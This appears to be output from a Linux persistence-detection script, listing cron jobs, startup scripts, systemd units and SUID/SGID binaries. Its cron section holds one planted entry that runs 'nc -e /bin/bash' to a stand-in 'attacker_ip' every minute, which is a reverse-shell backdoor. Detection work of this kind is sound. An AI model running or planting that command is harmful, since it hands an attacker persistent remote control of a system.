[+] Running Persistence Detection...
=== CRON JOBS ===
* * * * * nc -e /bin/bash attacker_ip 4444
/etc/crontab

/etc/cron.d:
anacron
e2scrub_all
sysstat

/etc/cron.daily:
00logwatch
0anacron
apport
apt-compat
dpkg
logrotate
man-db
sysstat

/etc/cron.hourly:

/etc/cron.monthly:
0anacron

/etc/cron.weekly:
0anacron
man-db

/etc/cron.yearly:
=== STARTUP SCRIPTS ===
alsa-utils
anacron
apparmor
apport
bluetooth
console-setup.sh
cron
cups
dbus
gdm3
grub-common
kerneloops
keyboard-setup.sh
kmod
openvpn
plymouth
plymouth-log
postfix
procps
qemu-guest-agent
rsync
saned
speech-dispatcher
spice-vdagent
sssd
sysstat
ufw
unattended-upgrades
uuidd
whoopsie
x11-common
=== SYSTEMD SERVICES ===
UNIT FILE                                    STATE           PRESET
uuidd.service                                indirect        enabled
wacom-inputattach@.service                   static          -
whoopsie.service                             static          -
wpa_supplicant-nl80211@.service              disabled        enabled
wpa_supplicant-wired@.service                disabled        enabled
wpa_supplicant.service                       enabled         enabled
wpa_supplicant@.service                      disabled        enabled
x11-common.service                           masked          enabled

275 unit files listed.
=== SUID/SGID BINARIES ===
/snap/core24/1499/usr/bin/chfn
/snap/core24/1499/usr/bin/chsh
/snap/core24/1499/usr/bin/gpasswd
/snap/core24/1499/usr/bin/mount
/snap/core24/1499/usr/bin/newgrp
/snap/core24/1499/usr/bin/passwd
/snap/core24/1499/usr/bin/su
/snap/core24/1499/usr/bin/sudo
/snap/core24/1499/usr/bin/umount
/snap/core24/1499/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core24/1499/usr/lib/openssh/ssh-keysign
/snap/core24/1499/usr/lib/polkit-1/polkit-agent-helper-1
/snap/core24/1587/usr/bin/chfn
/snap/core24/1587/usr/bin/chsh
/snap/core24/1587/usr/bin/gpasswd
/snap/core24/1587/usr/bin/mount
/snap/core24/1587/usr/bin/newgrp
/snap/core24/1587/usr/bin/passwd
/snap/core24/1587/usr/bin/su
/snap/core24/1587/usr/bin/sudo
/snap/core24/1587/usr/bin/umount
/snap/core24/1587/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core24/1587/usr/lib/openssh/ssh-keysign
/snap/core24/1587/usr/lib/polkit-1/polkit-agent-helper-1
/snap/core22/2411/usr/bin/chfn
/snap/core22/2411/usr/bin/chsh
/snap/core22/2411/usr/bin/gpasswd
/snap/core22/2411/usr/bin/mount
/snap/core22/2411/usr/bin/newgrp
/snap/core22/2411/usr/bin/passwd
/snap/core22/2411/usr/bin/su
/snap/core22/2411/usr/bin/sudo
/snap/core22/2411/usr/bin/umount
/snap/core22/2411/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/2411/usr/lib/openssh/ssh-keysign
/snap/core22/2411/usr/libexec/polkit-agent-helper-1
/snap/core22/2339/usr/bin/chfn
/snap/core22/2339/usr/bin/chsh
/snap/core22/2339/usr/bin/gpasswd
/snap/core22/2339/usr/bin/mount
/snap/core22/2339/usr/bin/newgrp
/snap/core22/2339/usr/bin/passwd
/snap/core22/2339/usr/bin/su
/snap/core22/2339/usr/bin/sudo
/snap/core22/2339/usr/bin/umount
/snap/core22/2339/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/2339/usr/lib/openssh/ssh-keysign
/snap/core22/2339/usr/libexec/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/su
/usr/bin/fusermount3
/usr/bin/chsh
/usr/sbin/pppd
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
